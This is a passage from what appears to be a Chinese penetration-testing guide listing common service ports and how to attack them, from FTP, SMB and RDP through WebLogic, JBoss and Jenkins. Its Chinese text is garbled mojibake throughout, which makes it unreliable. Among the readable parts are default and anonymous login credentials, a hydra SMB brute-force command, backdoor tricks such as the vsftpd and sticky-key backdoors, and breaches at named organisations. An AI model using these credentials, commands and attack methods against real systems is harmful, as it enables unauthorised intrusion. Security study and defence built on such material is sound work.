·çš„æ–¹æ³•ï¼Œæœ€ä¸ºå¸¸è§çš„åº”è¯¥å°±æ˜¯nmapäº†å§ï¼æˆ‘ä»¬ä¹Ÿå¯ä»¥ç»“åˆå…¶ä»–çš„ç«¯å£æ‰«æå·¥å…·ï¼Œæ¯”å¦‚ä¸“é—¨çš„3389ã€1433ç­‰ç­‰çš„ç«¯å£æ‰«æå·¥å…·ï¼› æœåŠ¡é»˜è®¤ç«¯å£å…¬è®¤ç«¯å£(Well Known Ports)ï¼š0-1023ï¼Œä»–ä»¬ç´§å¯†ç»‘å®šäº†ä¸€äº›æœåŠ¡ï¼› æ³¨å†Œç«¯å£(Registered Ports)ï¼š1024-49151ï¼Œä»–ä»¬æ¾æ•£çš„ç»‘å®šäº†ä¸€äº›æœåŠ¡ï¼› åŠ¨æ€/ç§æœ‰ï¼š49152-65535ï¼Œä¸ä¸ºæœåŠ¡åˆ†é…è¿™äº›ç«¯å£ï¼› å½“ç„¶è¿™äº›ç«¯å£éƒ½å¯ä»¥é€šè¿‡ä¿®æ”¹æ¥è¾¾åˆ°æ¬ºéª—æ”»å‡»è€…çš„ç›®çš„ï¼Œä½†æ˜¯è¿™å°±å®‰å…¨äº†å—ï¼Ÿæ”»å‡»è€…åˆå¯ä»¥ä½¿ç”¨ä»€ä¹ˆæ”»å‡»æ–¹å¼æ¥æ”»å‡»è¿™äº›ç«¯å£å‘¢ï¼Ÿ è¿˜éœ€è¦æ³¨æ˜çš„ä¸€ç‚¹æ˜¯ï¼šå¾ˆå¤šæœ¨é©¬å·¥å…·ä¹Ÿæœ‰ç‰¹å®šçš„ç«¯å£ï¼Œæœ¬æ–‡å¹¶æ²¡æœ‰æ¶‰åŠåˆ°è¿™å—çš„å†…å®¹ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å»æ”¶é›†æ”¶é›†ï¼ å…³äºçˆ†ç ´ä¹‹æˆ‘è§åœ¨å¯¹è¿™äº›ç«¯å£è¿›è¡Œå®æˆ˜è®²è§£æ—¶ï¼Œæˆ‘éœ€è¦å…ˆé˜è¿°ä¸€ä¸‹æˆ‘å¯¹çˆ†ç ´è¿™ä¸ªæ–¹å¼çš„ä¸€äº›çœ‹æ³•ï¼› çˆ†ç ´ï¼šæŠ€æœ¯æœ€ç®€å•ï¼Œéœ€è¦çš„æŠ€æœ¯èƒ½åŠ›åŸºæœ¬ä¸º0ï¼Œå·¥ä½œæ•ˆç‡ä¸ç½‘ç»œã€ç¡¬ä»¶ç­‰ç›¸å…³ï¼Œåœ¨æˆ‘çœ‹æ¥çˆ†ç ´å…¶å®æ˜¯æœ€å¼ºå¤§çš„æ”»å‡»æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ç»“åˆä¸€äº›ç‰¹åˆ¶çš„å­—å…¸ï¼Œç»“åˆç¤¾å·¥æˆ‘ä»¬å¯ä»¥åœ¨å¾ˆçŸ­çš„æ—¶é—´è¾¾åˆ°æœ€å¤§çš„æ•ˆæœï¼Œåªä¸è¿‡å› ä¸ºæˆ‘ä»¬çš„pcæˆ–è€…å­—å…¸ä¸å¤Ÿå¼ºå¤§ï¼Œæ‰€ä»¥å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¸èƒ½è¿›è¡Œä¸€æ¬¡ä¼˜ç§€çš„çˆ†ç ´æ”»å‡»ï¼›å½“ç„¶ç°åœ¨å¾ˆå¤šwebåº”ç”¨ä»¥åŠæœåŠ¡ç«¯å£éƒ½é™åˆ¶äº†æš´åŠ›ç ´è§£ï¼›å¯¹äºè¿™ç§åšäº†é™åˆ¶çš„æˆ‘ä»¬å¯èƒ½å°±éœ€è¦åˆ©ç”¨åˆ°æœ¬æ–‡æåˆ°çš„å…¶ä»–æ”»å‡»äº†ï¼ åˆ†äº«ä¸€ä¸ªå›¢é˜Ÿsaiæ€»ç»“çš„å­—å…¸ï¼šè¯·ç‚¹å‡» å£°æ˜ï¼šæœ¬æ–‡æ€»ç»“çš„éƒ½æ˜¯è¿‘ä¸¤å¹´çš„å¸¸è§æ¼æ´ï¼Œä»¥å‰çš„è€ç‰ˆæ¼æ´ä»¥åŠå±å®³æ€§ä¸å¤§çš„æ¼æ´æ²¡æœ‰æ€»ç»“ï¼Œæœ›å¤§å®¶è°…è§£ï¼ 0x01 å®æˆ˜æµ‹è¯•æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£æ¸—é€ftpæœåŠ¡FTPæœåŠ¡ï¼šftpæœåŠ¡æˆ‘åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æ˜¯ä½¿ç”¨ç³»ç»Ÿè½¯ä»¶æ¥é…ç½®ï¼Œæ¯”å¦‚IISä¸­çš„FTPæ–‡ä»¶å…±äº«æˆ–Linuxä¸­çš„é»˜è®¤æœåŠ¡è½¯ä»¶ï¼›ç¬¬äºŒç§æ˜¯é€šè¿‡ç¬¬ä¸‰æ–¹è½¯ä»¶æ¥é…ç½®ï¼Œæ¯”å¦‚Serv-Uè¿˜æœ‰ä¸€äº›ç½‘ä¸Šå†™çš„ç®€æ˜“ftpæœåŠ¡å™¨ç­‰ï¼› é»˜è®¤ç«¯å£ï¼š20ï¼ˆæ•°æ®ç«¯å£ï¼‰ï¼›21ï¼ˆæ§åˆ¶ç«¯å£ï¼‰ï¼›69ï¼ˆtftpå°å‹æ–‡ä»¶ä¼ è¾“åè®®ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šftpçš„çˆ†ç ´å·¥å…·æœ‰å¾ˆå¤šï¼Œè¿™é‡Œæˆ‘æ¨èowaspçš„Bruterä»¥åŠmsfä¸­ftpçˆ†ç ´æ¨¡å—ï¼› åŒ¿åè®¿é—®ï¼šç”¨æˆ·åï¼šanonymous å¯†ç ï¼šä¸ºç©ºæˆ–ä»»æ„é‚®ç®± ç”¨æˆ·åï¼šFTP å¯†ç ï¼šFTPæˆ–ä¸ºç©º ç”¨æˆ·åï¼šUSET å¯†ç ï¼špass å½“ç„¶è¿˜æœ‰ä¸éœ€è¦ç”¨æˆ·åå¯†ç ç›´æ¥è®¿é—®çš„ï¼Œä¸€èˆ¬å‡ºç°åœ¨å±€åŸŸç½‘ä¸­ï¼› å—…æ¢ï¼šftpä½¿ç”¨æ˜æ–‡ä¼ è¾“æŠ€æœ¯ï¼ˆä½†æ˜¯å—…æ¢ç»™äºˆå±€åŸŸç½‘å¹¶éœ€è¦æ¬ºéª—æˆ–ç›‘å¬ç½‘å…³ï¼‰ åé—¨æŠ€æœ¯ï¼šåœ¨linuxçš„vsftpæŸä¸€ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ç€ä¸€ä¸ªåé—¨ç¨‹åºï¼Œåªè¦åœ¨ç”¨æˆ·ååé¢åŠ ä¸Š å°±ä¼šåœ¨6200ä¸Šæ‰“å¼€ä¸€ä¸ªç›‘å¬Shellï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨telnetç›´æ¥è¿æ¥ï¼›è¯¦ç»†è¯·ç‚¹å‡» è¿œç¨‹æº¢å‡ºæ¼æ´ï¼š6.10.1 IIS FTPè¿œç¨‹æº¢å‡ºæ¼æ´ï¼Œåœ¨IIS FTPæœåŠ¡å™¨ä¸­NLSTå‘½ä»¤å­˜åœ¨ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å¯èƒ½æ˜¯æ”»å‡»è€…åœ¨æœåŠ¡å™¨è¿è¡Œä¸€æ¡éæ³•å‘½ä»¤ã€‚ è·³è½¬æ”»å‡»ï¼šï¼ˆBounce Attacksï¼‰æ”»å‡»è€…å‘é€ä¸€ä¸ªFTPâ€PORTâ€å‘½ä»¤ç»™ç›®æ ‡FTPæœåŠ¡å™¨ï¼Œå…¶ä¸­åŒ…å«è¯¥ä¸»æœºçš„ç½‘ç»œåœ°å€å’Œè¢«æ”»å‡»çš„æœåŠ¡çš„ç«¯å£å·ã€‚è¿™æ ·ï¼Œå®¢æˆ·ç«¯å°±èƒ½å‘½ä»¤FTPæœåŠ¡å™¨å‘ä¸€ä¸ªæ–‡ä»¶ç»™è¢«æ”»å‡»çš„æœåŠ¡ã€‚è¿™ä¸ªæ–‡ä»¶å¯èƒ½åŒ…æ‹¬æ ¹è¢«æ”»å‡»çš„æœåŠ¡æœ‰å…³çš„å‘½ä»¤ï¼ˆå¦‚SMTP,NNTPç­‰ï¼‰ã€‚ç”±äºæ˜¯å‘½ä»¤ç¬¬ä¸‰æ–¹å»è¿æ¥åˆ°ä¸€ç§æœåŠ¡ï¼Œè€Œä¸æ˜¯ç›´æ¥è¿æ¥ï¼Œå°±ä½¿å¾—è·Ÿè¸ªæ”»å‡»è€…å˜å¾—å›°éš¾ï¼Œå¹¶ä¸”è¿˜é¿å¼€äº†åŸºäºç½‘ç»œåœ°å€çš„è®¿é—®é™åˆ¶ã€‚ï¼ˆæ³¨ï¼šæ­¤ç§æƒ…å†µå°ç™½å¹¶æ²¡æœ‰é‡åˆ°è¿‡ï¼Œåªæ˜¯æ€»ç»“ä¸€ä¸‹ï¼Œæ¬¢è¿å¤§ç‰›æŒ‡æ•™ï¼‰ æ¡ˆä¾‹åˆ†äº«ï¼š å±±ä¸œç”µä¿¡Serv-U Webå®¢æˆ·ç«¯å¼±å£ä»¤ é•¿è™¹ftpå¼±å£ä»¤å¯¼è‡´å…¨ç½‘æ•°æ®æ³„æ¼ NFSæœåŠ¡nfsï¼šç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œå…è®¸ç½‘ç»œä¸­çš„è®¡ç®—æœºé€šè¿‡TCP/IPç½‘ç»œå…±äº«èµ„æºã€‚åŸºäºLinuxç³»ç»Ÿï¼Œé…ç½®æ–¹é¢å¾ˆç®€å•ï¼Œè¯¦ç»†é…ç½®è¯·å‚è€ƒæ¡ˆä¾‹åˆ†äº«ã€‚åœ¨nfsé…ç½®ä¸­ï¼Œæœ‰ä¸åšä»»ä½•é™åˆ¶çš„ï¼Œæœ‰é™åˆ¶ç”¨æˆ·ï¼Œæœ‰é™åˆ¶IPï¼Œä»¥åŠåœ¨ç‰ˆæœ¬2.xä¸­æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨è¯ä¹¦æ¥éªŒè¯ç”¨æˆ·ã€‚å½“ç„¶ä¸åŒçš„é™åˆ¶å¯ä»¥é‡‡ç”¨çš„æ”»å‡»æ–¹å¼ä¹Ÿä¸ä¸€æ ·ï¼›å°±ç›®å‰è€Œè¨€ç½‘ä¸Šå…³äºnfsçš„æ”»å‡»è¿˜æ˜¯æ¯”è¾ƒå°‘çš„! é»˜è®¤ç«¯å£ï¼š2049 æ”»å‡»æ–¹å¼ï¼š æœªæˆæƒè®¿é—®ï¼šæœªé™åˆ¶IPä»¥åŠç”¨æˆ·æƒé™è®¾ç½®é”™è¯¯ æ¡ˆä¾‹åˆ†äº«ï¼š Nfsé…ç½®ä¸å½“å¯¼è‡´è¢«å…¥ä¾µ NFSæœåŠ¡å…¨æ”»ç•¥ SambaæœåŠ¡SambaæœåŠ¡ï¼šå¯¹äºè¿™ä¸ªå¯ä»¥åœ¨windowsä¸Linuxä¹‹é—´è¿›è¡Œå…±äº«æ–‡ä»¶çš„æœåŠ¡åŒæ ·æ˜¯æˆ‘ä»¬æ”»å‡»çš„å…³æ³¨ç‚¹ï¼›sambaç™»å½•åˆ†ä¸ºä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯éœ€è¦ç”¨æˆ·åå£ä»¤ï¼›å¦ä¸€ç§æ˜¯ä¸éœ€è¦ç”¨æˆ·åå£ä»¤ã€‚åœ¨å¾ˆå¤šæ—¶å€™ä¸å…‰æ˜¯pcæœºï¼Œè¿˜æœ‰ä¸€äº›æœåŠ¡å™¨ï¼Œç½‘ç»œè®¾å¤‡éƒ½å¼€æ”¾ç€æ­¤æœåŠ¡ï¼Œæ–¹ä¾¿è¿›è¡Œæ–‡ä»¶å…±äº«ï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿç»™æ”»å‡»è€…æä¾›äº†ä¾¿åˆ©ã€‚ é»˜è®¤ç«¯å£ï¼š137ï¼ˆä¸»è¦ç”¨æˆ·NetBIOS Name Serviceï¼›NetBIOSåç§°æœåŠ¡ï¼‰ã€139ï¼ˆNetBIOS Session Serviceï¼Œä¸»è¦æä¾›sambaæœåŠ¡ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ï¼ˆçˆ†ç ´å·¥å…·é‡‡ç”¨hydraï¼‰hydra -l username -PPassFile IP smb æœªæˆæƒè®¿é—®ï¼šç»™äºˆpublicç”¨æˆ·é«˜æƒé™ è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼šCVE-2015-0240ç­‰ç­‰ æ¡ˆä¾‹åˆ†äº«ï¼š Sambaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ æœªæˆæƒè®¿é—®æ–‡ä»¶ç³»ç»Ÿæ¼æ´ LDAPåè®®ldapï¼šè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œæœ€è¿‘å‡ å¹´éšç€ldapçš„å¹¿æ³›ä½¿ç”¨è¢«å‘ç°çš„æ¼æ´ä¹Ÿè¶Šæ¥è¶Šå¤šã€‚ä½†æ˜¯æ¯•ç«Ÿä¸»æµçš„æ”»å‡»æ–¹å¼ä»æ—§æ˜¯é‚£äº›ï¼Œæ¯”å¦‚æ³¨å…¥ï¼Œæœªæˆæƒç­‰ç­‰ï¼›è¿™äº›é—®é¢˜çš„å‡ºç°ä¹Ÿéƒ½æ˜¯å› ä¸ºé…ç½®ä¸å½“è€Œé€ æˆçš„ã€‚ é»˜è®¤ç«¯å£ï¼š389 æ”»å‡»æ–¹å¼ï¼š æ³¨å…¥æ”»å‡»ï¼šç›²æ³¨ æœªæˆæƒè®¿é—®ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ æ¡ˆä¾‹åˆ†äº«ï¼š LDAPæ³¨å…¥ä¸é˜²å¾¡å‰–æ æ¬§æœ‹LDAPæœåŠ¡åŒ¿åè®¿é—® ä½¿ç”¨LDAPæŸ¥è¯¢å¿«é€Ÿæå‡åŸŸæƒé™ è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£æ¸—é€SSHæœåŠ¡SSHæœåŠ¡ï¼šè¿™ä¸ªæœåŠ¡åŸºæœ¬ä¼šå‡ºç°åœ¨æˆ‘ä»¬çš„LinuxæœåŠ¡å™¨ï¼Œç½‘ç»œè®¾å¤‡ï¼Œå®‰å…¨è®¾å¤‡ç­‰è®¾å¤‡ä¸Šï¼Œè€Œä¸”å¾ˆå¤šæ—¶å€™è¿™ä¸ªæœåŠ¡çš„é…ç½®éƒ½æ˜¯é»˜è®¤çš„ï¼›å¯¹äºSSHæœåŠ¡æˆ‘ä»¬å¯èƒ½ä½¿ç”¨çˆ†ç ´æ”»å‡»æ–¹å¼è¾ƒå¤šã€‚ é»˜è®¤ç«¯å£ï¼š22 æ”»å‡»æ–¹å¼ çˆ†ç ´ï¼šå¼±å£ä»¤ã€ æ¼æ´ï¼š28é€€æ ¼æ¼æ´ã€OpenSSLæ¼æ´ æ¡ˆä¾‹åˆ†äº«ï¼š å®‰å®‡åˆ›æ–°ç§‘æŠ€sshå¼±å£ä»¤ å®œä¿¡è´·æŸç«™å­˜åœ¨OpenSSLæ¼æ´ TelnetæœåŠ¡TelnetæœåŠ¡ï¼šåœ¨SSHæœåŠ¡å´›èµ·çš„ä»Šå¤©æˆ‘ä»¬å·²ç»å¾ˆéš¾è§åˆ°ä½¿ç”¨telnetçš„æœåŠ¡å™¨ï¼Œä½†æ˜¯åœ¨å¾ˆå¤šè®¾å¤‡ä¸ŠåŒæ ·è¿˜æ˜¯æœ‰è¿™ä¸ªæœåŠ¡çš„ï¼›æ¯”å¦‚ciscoã€åä¸‰ï¼Œæ·±ä¿¡æœç­‰å‚å•†çš„è®¾å¤‡ï¼›æˆ‘å°±æœ‰å¾ˆå¤šæ¬¡é€šè¿‡telnetå¼±å£ä»¤æ§åˆ¶è¿™äº›è®¾å¤‡ï¼› é»˜è®¤ç«¯å£ï¼š23 æ”»å‡»æ–¹å¼ çˆ†ç ´ï¼šå¼±å£ä»¤ å—…æ¢ï¼šæ­¤ç§æƒ…å†µä¸€èˆ¬å‘ç”Ÿåœ¨å±€åŸŸç½‘ï¼› æ¡ˆä¾‹åˆ†äº«ï¼š å¤§é‡æƒ æ™®æ‰“å°æœºè¿œç¨‹telnetå¯è¢«æŸ¥çœ‹å’Œæ“ä½œ Windowsè¿œç¨‹è¿æ¥è¿œç¨‹æ¡Œé¢è¿æ¥ï¼šä½œä¸ºwindowsä¸Šè¿›è¡Œè¿œç¨‹è¿æ¥çš„ç«¯å£ï¼Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬åœ¨å¾—åˆ°ç³»ç»Ÿä¸ºwindowsçš„shellçš„æ—¶å€™æˆ‘ä»¬æ€»æ˜¯å¸Œæœ›å¯ä»¥ç™»å½•3389å®é™…æ“ä½œå¯¹æ–¹ç”µè„‘ï¼›è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¸€èˆ¬çš„æƒ…å†µåˆ†ä¸ºä¸¤ç§ã€‚ä¸€ç§æ˜¯å†…ç½‘ï¼Œéœ€è¦å…ˆå°†ç›®æ ‡æœº3389ç«¯å£åå¼¹åˆ°å¤–ç½‘ï¼›å¦ä¸€ç§å°±æ˜¯å¤–ç½‘ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—®ï¼›å½“ç„¶è¿™ä¸¤ç§æƒ…å†µæˆ‘ä»¬åˆ©ç”¨èµ·æ¥å¯èƒ½éœ€è¦å¾ˆè‹›åˆ»çš„æ¡ä»¶ï¼Œæ¯”å¦‚æ‰¾åˆ°ç™»å½•å¯†ç ç­‰ç­‰ï¼› é»˜è®¤ç«¯å£ï¼š3389 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼š3389ç«¯å£çˆ†ç ´å·¥å…·å°±æœ‰ç‚¹å¤šäº† Shiftç²˜æ»é”®åé—¨ï¼š5æ¬¡shiftåé—¨ 3389æ¼æ´æ”»å‡»ï¼šåˆ©ç”¨ms12-020æ”»å‡»3389ç«¯å£ï¼Œå¯¼è‡´æœåŠ¡å™¨å…³æœºï¼›è¯·å‚è€ƒ VNCæœåŠ¡VNCï¼šä¸€æ¬¾ä¼˜ç§€çš„è¿œæ§å·¥å…·ï¼Œå¸¸ç”¨è¯­ç±»UNIXç³»ç»Ÿä¸Šï¼Œç®€å•åŠŸèƒ½å¼ºå¤§ï¼›ä¹Ÿ é»˜è®¤ç«¯å£ï¼š5900+æ¡Œé¢IDï¼ˆ5901ï¼›5902ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ è®¤è¯å£ä»¤ç»•è¿‡ï¼š æ‹’ç»æœåŠ¡æ”»å‡»ï¼šï¼ˆCVE-2015-5239ï¼‰ æƒé™æå‡ï¼šï¼ˆCVE-2013-6886ï¼‰ æ¡ˆä¾‹åˆ†äº«ï¼š å¹¿è¥¿ç”µä¿¡å®¢æœæœåŠ¡å™¨ä½¿ç”¨VNCå­˜åœ¨å¼±å£ä»¤å¯ç›´æ¥æ§åˆ¶ PcanywhereæœåŠ¡PyAnywhereæœåŠ¡ï¼šä¸€æ¬¾è¿œæ§å·¥å…·ï¼Œæœ‰ç‚¹ç±»ä¼¼vncçš„åŠŸèƒ½ï¼›è¿™ä¸ªæœåŠ¡åœ¨ä»¥å‰å¾ˆå¤šé»‘å®¢å‘çš„è§†é¢‘é‡Œé¢éƒ½æœ‰ï¼Œåˆ©ç”¨pcanywhereæ¥è¿›è¡Œææƒï¼› é»˜è®¤ç«¯å£ï¼š5632 æ”»å‡»æ–¹å¼ï¼š ææƒæ§åˆ¶æœåŠ¡ï¼š æ‹’ç»æœåŠ¡æ”»å‡»ï¼š ä»£ç æ‰§è¡Œï¼šè¯·å‚è€ƒ æ¡ˆä¾‹åˆ†äº«ï¼š é»‘é¾™æ±Ÿç‰©ä»·å±€å¤šå¤„å®‰å…¨æ¼æ´å¯èƒ½å¯¼è‡´æœåŠ¡å™¨æ²¦é™·(pcAnywhereææƒ+å¯†ç çªç ´) Webåº”ç”¨æœåŠ¡ç«¯å£æ¸—é€HTTPæœåŠ¡ï¼šå¯¹äºhttpæœåŠ¡å…¶å®æ˜¯æˆ‘ä»¬ç›®å‰è¿™å‡ å¹´æ¯”è¾ƒå¸¸è§çš„æ”»å‡»å…¥å£ï¼Œæ‰€ä»¥è¿™é‡Œä¼šé’ˆå¯¹httpæœåŠ¡è¿›è¡Œä¸€ä¸ªè¯¦ç»†çš„è¯¦è§£ï¼› æ³¨ï¼šè¿™ä¸ªæ¿å—çš„æ‰€æœ‰æ”»å‡»æ–¹å¼ï¼Œå¦‚æœæ¶‰åŠåˆ°å¸¸è§„çš„webæ¼æ´ä¸ä¼šæå‡ºæ¥ï¼Œé™¤éæ˜¯ç‰¹å®šçš„æœåŠ¡å™¨æ‰ä¼šäº§ç”Ÿçš„æ¼æ´ï¼› IISæœåŠ¡é»˜è®¤ç«¯å£ï¼š80/81/443 æ”»å‡»æ–¹å¼ï¼š IISPUTå†™æ–‡ä»¶ï¼šåˆ©ç”¨IISæ¼æ´ï¼Œputæ–¹æ³•ç›´æ¥å°†æ–‡ä»¶æ”¾ç½®åˆ°æœåŠ¡å™¨ä¸Š çŸ­æ–‡ä»¶åæ³„æ¼ï¼šè¿™ç§ä¸€èˆ¬æ²¡å•¥å½±å“ è§£ææ¼æ´ï¼šè¯¦ç»†è§apacheæœåŠ¡ æ¡ˆä¾‹åˆ†äº«ï¼š å¾å·å¸‚æ•™è‚²ç³»ç»Ÿå¤§é‡IIS PUTæ¼æ´ ç”¨å‹è½¯ä»¶IISå†™æƒé™(PUT)å¯¼è‡´å¯è·å–webshellæ§åˆ¶æœåŠ¡å™¨ å›½å®¶ç”µç½‘æŸåˆ†ç«™å­˜åœ¨iisçŸ­æ–‡ä»¶åæ¼æ´ Apache/Tomcat/Nginx/Axis2é»˜è®¤ç«¯å£ï¼š80/8080 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ï¼ˆçˆ†ç ´manageråå°ï¼‰ HTTPæ…¢é€Ÿæ”»å‡»ï¼šå¯ä»¥æŠŠæœåŠ¡å™¨æ‰“æ­»ï¼Œå¯¹ä¸€äº›å¤§å‹çš„ç½‘ç«™æœ‰å½±å“ï¼› è§£ææ¼æ´ï¼šè¯·å‚è€ƒ æ¡ˆä¾‹åˆ†äº«ï¼š å®‰å“å¼€å‘å¹³å°å­˜åœ¨ä¸Šä¼ æ¼æ´å’ŒApacheè§£ææ¼æ´,æˆåŠŸè·å–webshell è…¾è®¯åˆ†ç«™ Apache æ¼æ´ WebLogicé»˜è®¤ç«¯å£ï¼š7001 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ 4ç»„ï¼šç”¨æˆ·åå¯†ç å‡ä¸€è‡´ï¼šsystem weblogicï¼ˆå¯†ç å¯èƒ½weblogic123ï¼‰ portaladmin guest Congsoleåå°éƒ¨ç½²webshellï¼š Javaååºåˆ—åŒ–ï¼š æ³„æ¼æºä»£ç /åˆ—ç›®å½•ï¼šè¿™ä¸ªå¤ªè€äº†ï¼Œä¼°è®¡ç½‘ä¸Šéƒ½æ²¡æœ‰äº†å§ï¼ SSRFçª¥æ¢å†…ç½‘ï¼šå¤®è§†ç½‘SSRFå¯çª¥æ¢å†…ç½‘ æ¡ˆåˆ—åˆ†äº«ï¼š ç¦å»ºçœäººåŠ›èµ„æºå’Œç¤¾ä¼šä¿éšœå…ä¸‹å±æŸWEBLOGICå¼±å£ä»¤ åˆ©ç”¨Weblogicè¿›è¡Œå…¥ä¾µçš„ä¸€äº›æ€»ç»“ Jbossé»˜è®¤ç«¯å£8080ï¼›å…¶ä»–ç«¯å£1098/1099/4444/4445/8080/8009/8083/8093 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ï¼ˆçˆ†ç ´jbossç³»ç»Ÿåå°ï¼‰ è¿œç¨‹ä»£ç æ‰§è¡Œï¼šç”±äºé…ç½®ä¸å½“é€ æˆ Javaååºåˆ—åŒ–ï¼š æ¡ˆä¾‹åˆ†äº« ä¸­åäººæ°‘å…±å’Œå›½æ°‘æ”¿éƒ¨JBossé…ç½®ä¸å½“ JBOSSå®‰å…¨é—®é¢˜æ€»ç»“ ä¸­å›½ç§‘å­¦é™¢æŸå¤„jbossåº”ç”¨æ¼æ´ Websphereé»˜è®¤ç«¯å£ï¼š908*ï¼›ç¬¬ä¸€ä¸ªåº”ç”¨å°±æ˜¯9080ï¼Œç¬¬äºŒä¸ªå°±æ˜¯9081ï¼›æ§åˆ¶å°9090 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ï¼ˆæ§åˆ¶å°ï¼‰ ä»»æ„æ–‡ä»¶æ³„æ¼ï¼šï¼ˆCVE-2014-0823ï¼‰ Javaååºåˆ—åŒ– æ¡ˆä¾‹åˆ†äº«ï¼š ä¸­å›½ç”µä¿¡æŸé€šç”¨å‹ä¸šåŠ¡ç³»ç»Ÿ(Websphere)GetShellæ¼æ´ å¤§æ±‰ç½‘ç»œæœ‰é™å…¬å¸è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(WebSphereæ¡ˆä¾‹) GlassFishé»˜è®¤ç«¯å£ï¼šhttp 8080ï¼›IIOP 3700ï¼›æ§åˆ¶å°4848 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ï¼ˆå¯¹äºæ§åˆ¶å°ï¼‰ ä»»æ„æ–‡ä»¶è¯»å–ï¼š è®¤è¯ç»•è¿‡ï¼š æ¡ˆä¾‹åˆ†äº«ï¼š åº”ç”¨æœåŠ¡å™¨glassfishå­˜åœ¨é€šç”¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ Oracle GlassFish Serverè®¤è¯ç»•è¿‡ Jenkinsé»˜è®¤ç«¯å£ï¼š8080ã€8089 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ï¼ˆé»˜è®¤ç®¡ç†å‘˜ï¼‰ æœªæˆæƒè®¿é—®ï¼š ååºåˆ—åŒ–ï¼š æ¡ˆä¾‹åˆ†äº«ï¼š é…·6Jenkinsç³»ç»Ÿæœªæˆæƒè®¿é—®å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ Resiné»˜è®¤ç«¯å£ï¼š8080 æ”»å‡»æ–¹å¼ï¼š ç›®å½•éå† è¿œç¨‹æ–‡ä»¶è¯»å– æ¡ˆä¾‹åˆ†äº«ï¼š çˆ±å¥‡è‰ºResiné…ç½®æ¼æ´ Resinæ¼æ´åˆ©ç”¨æ¡ˆä¾‹ä¹‹ç›®å½•éå†/ä»¥é‡‘è¶æŸç³»ç»Ÿä¸ºä¾‹ Jettyé»˜è®¤ç«¯å£ï¼š8080 æ”»å‡»æ–¹å¼ï¼š è¿œç¨‹å…±äº«ç¼“å†²åŒºæº¢å‡º Lotuså½±å“çš„éƒ½æ˜¯ä¸€äº›å¤§å‹çš„ä¼ä¸šï¼Œç‰¹åˆ«éœ€è¦æ³¨æ„ï¼Œç»è¿‡ä»¥å‰çš„æµ‹è¯•å‘ç°å¼±å£ä»¤è¿™ä¸ªé—®é¢˜ç»å¸¸éƒ½å­˜åœ¨ï¼Œå¯èƒ½æ˜¯å¾ˆå¤šç®¡ç†å‘˜ä¸çŸ¥é“å¦‚ä½•å»ä¿®æ”¹ï¼ˆä¸è¦æ‰“æˆ‘ï¼‰ã€‚ é»˜è®¤ç«¯å£ï¼š1352 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ï¼ˆadmin passwordï¼‰æ§åˆ¶å° ä¿¡æ¯æ³„éœ² è·¨ç«™è„šæœ¬æ”»å‡» æ¡ˆä¾‹åˆ†äº«ï¼š Lotus Domino WebMailä¸€å¤„è¶Šæƒè®¿é—® ä¸­ç”µæŠ•é›†å›¢æŸç³»ç»Ÿå¼±å£ä»¤ç›´è¾¾å†…ç½‘æ¶‰åŠ/OAç³»ç»Ÿ/å†…éƒ¨é‚®ç®±/è´¢åŠ¡ç³»ç»Ÿ/äººåŠ›èµ„æºç³»ç»Ÿ ä¸­å›½æŸå¤§å‹é‡‘èæœºæ„åœ°æ–¹ä¸šåŠ¡å¼±å£ä»¤å¯¼è‡´æ•°ä¸‡å•†æˆ·ä¿¡æ¯æ³„éœ²&amp;è®¿é—®Lotus Dominoåå° æ•°æ®åº“æœåŠ¡ç«¯å£æ¸—é€é’ˆå¯¹æ‰€æœ‰çš„æ•°æ®åº“æ”»å‡»æ–¹å¼éƒ½å­˜åœ¨SQLæ³¨å…¥ï¼Œè¿™é‡Œå…ˆæå‡ºæ¥åœ¨ä¸‹é¢å°±ä¸ä¸€ä¸€å†™äº†å…å¾—å¤§å®¶è¯´æˆ‘å ç¯‡å¹…ï¼›å½“ç„¶ä¸åŒçš„æ•°æ®åº“æ³¨å…¥æŠ€å·§å¯èƒ½ä¸ä¸€æ ·ï¼Œç‰¹åˆ«æ˜¯NoSQLä¸ä¼ ç»Ÿçš„SQLæ•°æ®åº“ä¸å¤ªä¸€æ 